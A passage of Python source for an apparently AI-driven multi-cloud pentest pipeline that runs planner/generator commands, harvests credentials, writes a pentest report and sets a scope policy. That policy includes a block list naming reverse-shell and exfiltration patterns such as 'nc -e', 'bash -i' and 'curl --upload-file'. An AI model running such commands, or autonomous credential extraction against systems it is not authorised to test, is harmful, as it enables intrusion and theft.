                                self.state["target_info"][k] = val
            except (json.JSONDecodeError, AttributeError):
                pass

        # ── Detect target info from az/gcloud config output ──
        if ("az account show" in cmd_lower or "gcloud config list" in cmd_lower) and result["success"]:
            try:
                data = json.loads(stdout)
                self.state["target_info"].update(
                    {k: str(v)[:100] for k, v in data.items() if isinstance(v, (str, int, bool))}
                )
            except (json.JSONDecodeError, TypeError):
                pass

        # ── Extract cloud artifacts from ALL output ──
        source_url = self.state.get("target_url", "")
        if "curl" in command and "http" in command:
            url_match = re.search(r"'(https?://[^']+)'", command)
            if url_match:
                source_url = url_match.group(1)
        self._extract_cloud_artifacts(combined, source_url)

        # ── Detect credential errors → rotate to next live credential ──
        if not result["success"] and self._detect_credential_errors(result):
            self._mark_credentials_dead()

    def _save_outputs(self):
        """Save execution log, state, and report."""
        # Execution log
        try:
            with open("real_exec_results.json", "w", encoding="utf-8") as f:
                json.dump(self.execution_log, f, indent=2, default=str)
        except Exception as e:
            logger.warning(f"  ⚠️ Failed to save exec results: {e}")

        # Inject LLM metrics into state before saving
        self.state["llm_metrics"] = self.api.llm_metrics

        # State
        try:
            with open("real_pentest_state.json", "w", encoding="utf-8") as f:
                json.dump(self.state, f, indent=2, default=str)
        except Exception as e:
            logger.warning(f"  ⚠️ Failed to save state: {e}")

        # Report
        try:
            report = self._generate_report()
            with open("real_pentest_report.md", "w", encoding="utf-8") as f:
                f.write(report)
        except Exception as e:
            logger.warning(f"  ⚠️ Failed to save report: {e}")

    def _generate_report(self) -> str:
        """Generate markdown pentest report — multi-cloud aware."""
        providers_str = ", ".join(p.upper() for p in self.cloud_providers)
        lines = [
            "# 🔒 Universal Cloud Pentest Report (AI-Driven)",
            "",
            f"**Target:** {self.target_description}",
            f"**Target URL:** {self.target_url or 'N/A'}",
            f"**Cloud Providers:** {providers_str}",
            f"**Generated:** {datetime.now().isoformat()}",
            f"**Mode:** Fully AI-driven (Planner/Generator)",
            "",
            "---",
            "",
            "## 📊 Executive Summary",
            "",
            f"- **Rounds:** {self.state['round']}",
            f"- **Commands executed:** {len(self.execution_log)}",
            f"- **Findings:** {len(self.state['findings'])}",
            f"- **Vulnerabilities found:** {len(self.state['vulnerabilities_found'])}",
            f"- **Exploits successful:** {len(self.state['exploits_successful'])}",
            f"- **Exploits failed:** {len(self.state['exploits_failed'])}",
            f"- **Credentials extracted:** {'YES' if self.state['credentials_found'] else 'NO'}",
            f"- **Secrets found:** {len(self.state['secrets_found'])}",
            f"- **Services detected:** {', '.join(self.state['services_detected']) or 'None'}",
            f"- **Objectives verified:** {len([v for v in self.state.get('objective_verifications', []) if isinstance(v, dict) and v.get('status') == 'verified'])}",
            f"- **Flags found (bonus):** {', '.join(self.state['flags_found']) or 'None'}",
            "",
        ]

        # ── Vulnerabilities ──
        if self.state["vulnerabilities_found"]:
            lines.extend(["## 🔥 Vulnerabilities Found", ""])

            # Sort by severity: CRITICAL > HIGH > MEDIUM > LOW
            sev_order = {"CRITICAL": 0, "HIGH": 1, "MEDIUM": 2, "LOW": 3}
            sorted_vulns = sorted(
                self.state["vulnerabilities_found"],
                key=lambda v: sev_order.get(v.get("severity", "LOW"), 9),
            )

            for vuln in sorted_vulns:
                sev = vuln.get("severity", "?")
                sev_icon = {"CRITICAL": "🔴", "HIGH": "🟠", "MEDIUM": "🟡", "LOW": "🟢"}.get(sev, "⚪")
                lines.append(f"### {sev_icon} [{sev}] {vuln.get('description', 'Unknown')}")
                lines.append(f"- **ID:** `{vuln.get('id', 'N/A')}`")
                lines.append(f"- **Found in round:** {vuln.get('round', '?')}")
                lines.append(f"- **Detected by command:** `{vuln.get('found_in_cmd', 'N/A')[:100]}`")
                lines.append(f"- **Remediation:** {vuln.get('remediation', 'N/A')}")
                lines.append("")
        else:
            lines.extend(["## 🔥 Vulnerabilities Found", "", "_No vulnerabilities detected._", ""])

        # ── Exploits ──
        if self.state["exploits_successful"] or self.state["exploits_failed"]:
            lines.extend(["## ⚔️ Exploits", ""])

            if self.state["exploits_successful"]:
                lines.append("### ✅ Successful Exploits")
                lines.append("")
                for i, ex in enumerate(self.state["exploits_successful"], 1):
                    lines.append(f"{i}. `{ex['command'][:120]}` (round {ex.get('round', '?')})")
                lines.append("")

            if self.state["exploits_failed"]:
                lines.append("### ❌ Failed Exploits")
                lines.append("")
                for i, ex in enumerate(self.state["exploits_failed"], 1):
                    lines.append(f"{i}. `{ex['command'][:120]}` (round {ex.get('round', '?')})")
                lines.append("")

        # ── Objective verification summary (rule-based) ──
        if self.state.get("objective_verifications"):
            lines.extend(["## 🧪 Objective Verification", ""])
            for v in self.state["objective_verifications"][-20:]:
                if not isinstance(v, dict):
                    continue
                lines.append(
                    f"- `{v.get('task_name', '?')}` → **{v.get('status', 'unknown')}** | "
                    f"{v.get('reason', '')[:140]}"
                )
            lines.append("")

        if self.state["flags_found"]:
            lines.extend(["## 🚩 FLAGS (Bonus)", ""])
            for flag in self.state["flags_found"]:
                lines.append(f"- `{flag}`")
            lines.append("")

        # ── Credentials by provider ──
        if self.state["credentials_found"]:
            lines.extend(["## 🔑 Extracted Credentials", ""])

            # Group by provider
            aws_creds = {k: v for k, v in self.state["credentials_found"].items()
                         if k.startswith("AWS_")}
            azure_creds = {k: v for k, v in self.state["credentials_found"].items()
                           if k.startswith("AZURE_")}
            gcp_creds = {k: v for k, v in self.state["credentials_found"].items()
                         if k.startswith("GCP_") or k.startswith("GOOGLE_")}
            other_creds = {k: v for k, v in self.state["credentials_found"].items()
                           if not any(k.startswith(p) for p in ("AWS_", "AZURE_", "GCP_", "GOOGLE_"))}

            for provider, cred_dict in [("AWS", aws_creds), ("Azure", azure_creds),
                                         ("GCP", gcp_creds), ("Other", other_creds)]:
                if cred_dict:
                    lines.append(f"### {provider}")
                    for k, v in cred_dict.items():
                        if any(s in k.upper() for s in ("SECRET", "TOKEN", "KEY", "PASSWORD")):
                            lines.append(f"- **{k}:** `****{v[-4:] if len(v) > 4 else '****'}`")
                        elif "JSON" in k.upper():
                            lines.append(f"- **{k}:** `<service-account-key-json>`")
                        else:
                            display = f"{v[:20]}..." if len(v) > 20 else v
                            lines.append(f"- **{k}:** `{display}`")
                    lines.append("")

        # ── Findings ──
        lines.extend(["## 🔍 Findings", ""])
        for i, f in enumerate(self.state["findings"], 1):
            lines.append(f"{i}. {OutputParser._redact_secrets(f)}")
        lines.append("")

        # ── Secrets ──
        if self.state["secrets_found"]:
            lines.extend(["## 🔐 Secrets Discovered", ""])
            for secret in self.state["secrets_found"]:
                lines.append(f"- {secret}")
            lines.append("")

        # ── Execution Log ──
        lines.extend([
            "## 📝 Execution Log",
            "",
            f"Total commands: {len(self.execution_log)}",
            "",
        ])

        for i, entry in enumerate(self.execution_log, 1):
            cmd = entry.get("command", "N/A")
            rc = entry.get("return_code", "?")
            success = "✅" if entry.get("success") else "❌"
            phase = entry.get("phase", "?")
            lines.append(f"{i}. [{phase}] `{cmd[:100]}` → {success} (rc={rc})")

        lines.append("")
        return "\n".join(lines)


def _default_scope_policy(target_url: Optional[str]) -> Optional["ScopePolicy"]:
    if not SCOPE_GUARD_AVAILABLE or ScopePolicy is None:
        return None
    allowed_hosts: List[str] = []
    if target_url:
        host = urlparse(target_url).hostname or ""
        if host:
            allowed_hosts.append(host)
    return ScopePolicy(
        allowed_hosts=allowed_hosts,
        allowed_tools=[
            "curl",
            "wget",
            "grep",
            "head",
            "tail",
            "sort",
            "sed",
            "awk",
            "jq",
            "nmap",
            "openssl",
            "dig",
            "nikto",
            "sslscan",
            "testssl",
            "gobuster",
            "ffuf",
            "aws",
            "az",
            "gcloud",
            "gsutil",
            "kubectl",
        ],
        blocked_command_patterns=[
            "rm -rf*",
            "*mkfs*",
            "*shutdown*",
            "*reboot*",
            "*nc -e*",
            "*bash -i*",
            "*curl*--upload-file*",
            "*scp *",
            "*rsync *",
        ],
    )


if __name__ == "__main__":
    import argparse

    parser = argparse.ArgumentParser(
        description="AI-Driven Universal Cloud Pentest Pipeline (AWS/Azure/GCP)",
        formatter_class=argparse.RawDescriptionHelpFormatter,
        epilog="""
Examples:
  # AWS target with web app
  python -m cage_cloud.orchestrator --target "Spring Boot on AWS EC2" --target-url http://target:8080

  # Azure target
  python -m cage_cloud.orchestrator --target "Azure web app with KeyVault" \\
    --azure-client-id <id> --azure-client-secret <secret> --azure-tenant-id <tenant>

  # GCP target
  python -m cage_cloud.orchestrator --target "GCP Cloud Run service" --gcp-project my-project

  # Multi-cloud
  python -m cage_cloud.orchestrator --target "AWS S3 + Azure Blob + GCP GCS storage audit"
        """,
    )

    # API settings
    parser.add_argument("--api-url", default=os.environ.get("API_URL", "http://localhost:8000"),
                        help="OpenAI-compatible base URL serving the Planner/Generator LLM")
    parser.add_argument("--api-key", default=os.environ.get("API_KEY", ""),
                        help="API key for the Planner/Generator endpoint (or set API_KEY env var)")
    parser.add_argument(
        "--planner-api-url",
        default=os.environ.get("PLANNER_API_URL"),
        help="Planner API base URL override (default: --api-url)",
    )
    parser.add_argument(
        "--generator-api-url",
        default=os.environ.get("GENERATOR_API_URL"),
        help="Generator API base URL override (default: --api-url)",
    )
    parser.add_argument(
        "--planner-api-key",
        default=os.environ.get("PLANNER_API_KEY"),
        help="Planner API key override (default: --api-key)",
    )
    parser.add_argument(
        "--generator-api-key",
        default=os.environ.get("GENERATOR_API_KEY"),
        help="Generator API key override (default: --api-key)",
    )
    parser.add_argument(
        "--planner-model",
        default=os.environ.get("PLANNER_MODEL_OVERRIDE"),
        help="Planner model override sent in /plan payload",
    )
    parser.add_argument(
        "--generator-model",
        default=os.environ.get("GENERATOR_MODEL_OVERRIDE"),
        help="Generator model override sent in /generate payload",
    )

    # Target
    parser.add_argument("--target-url", default=None, help="Target URL (web app)")
    parser.add_argument("--target", default="Cloud security audit",
                        help="Target description (used for cloud provider detection)")
    parser.add_argument("--max-rounds", type=int, default=15, help="Max pentest rounds")

    # AWS credentials
    aws_group = parser.add_argument_group("AWS")
    aws_group.add_argument("--aws-profile", default=None, help="AWS CLI profile name")
    aws_group.add_argument("--aws-access-key", default=None, help="AWS Access Key ID")
    aws_group.add_argument("--aws-secret-key", default=None, help="AWS Secret Access Key")
    aws_group.add_argument("--aws-session-token", default=None, help="AWS Session Token")
    aws_group.add_argument("--aws-region", default=None, help="AWS Region")

    # Azure credentials
    azure_group = parser.add_argument_group("Azure")
    azure_group.add_argument("--azure-client-id", default=None, help="Azure Client ID (App ID)")
    azure_group.add_argument("--azure-client-secret", default=None, help="Azure Client Secret")
    azure_group.add_argument("--azure-tenant-id", default=None, help="Azure Tenant ID")
    azure_group.add_argument("--azure-subscription", default=None, help="Azure Subscription ID")

    # GCP credentials
    gcp_group = parser.add_argument_group("GCP")
    gcp_group.add_argument("--gcp-project", default=None, help="GCP Project ID")
    gcp_group.add_argument("--gcp-key-file", default=None,
                           help="Path to GCP service account key JSON file")

    args = parser.parse_args()

    # Build initial cloud env from CLI args
    cloud_env = {}
    if args.aws_access_key:
        cloud_env["AWS_ACCESS_KEY_ID"] = args.aws_access_key
    if args.aws_secret_key:
        cloud_env["AWS_SECRET_ACCESS_KEY"] = args.aws_secret_key
    if args.aws_session_token:
        cloud_env["AWS_SESSION_TOKEN"] = args.aws_session_token
    if args.aws_region:
        cloud_env["AWS_DEFAULT_REGION"] = args.aws_region
    if args.azure_client_id:
        cloud_env["AZURE_CLIENT_ID"] = args.azure_client_id
    if args.azure_client_secret:
        cloud_env["AZURE_CLIENT_SECRET"] = args.azure_client_secret
    if args.azure_tenant_id:
        cloud_env["AZURE_TENANT_ID"] = args.azure_tenant_id
    if args.gcp_key_file:
        cloud_env["GOOGLE_APPLICATION_CREDENTIALS"] = args.gcp_key_file

    api = PlannerGeneratorAPI(
        args.api_url,
        args.api_key,
        planner_api_url=args.planner_api_url,
        generator_api_url=args.generator_api_url,
        planner_api_key=args.planner_api_key,
        generator_api_key=args.generator_api_key,
        planner_model=args.planner_model,
        generator_model=args.generator_model,
    )
    scope_policy = _default_scope_policy(args.target_url)
    executor = RealExecutor(
        cloud_env=cloud_env if cloud_env else None,
        aws_profile=args.aws_profile,
        gcp_project=args.gcp_project,
        azure_subscription=args.azure_subscription,
        scope_guard=ScopeGuard(scope_policy) if scope_policy and ScopeGuard else None,
    )

    # If Azure SP creds provided, do initial login
    if all([args.azure_client_id, args.azure_client_secret, args.azure_tenant_id]):
        executor._azure_sp_login({
            "AZURE_CLIENT_ID": args.azure_client_id,
            "AZURE_CLIENT_SECRET": args.azure_client_secret,
            "AZURE_TENANT_ID": args.azure_tenant_id,
        })

    # If GCP key file provided, activate SA
    if args.gcp_key_file:
        with open(args.gcp_key_file, "r") as f:
            executor._activate_gcp_service_account(f.read())

    pipeline = AIDrivenPipeline(
        api=api,
        executor=executor,
        target_description=args.target,
        target_url=args.target_url,
        max_rounds=args.max_rounds,
    )

    try:
        pipeline.run()
    finally:
        executor.close()
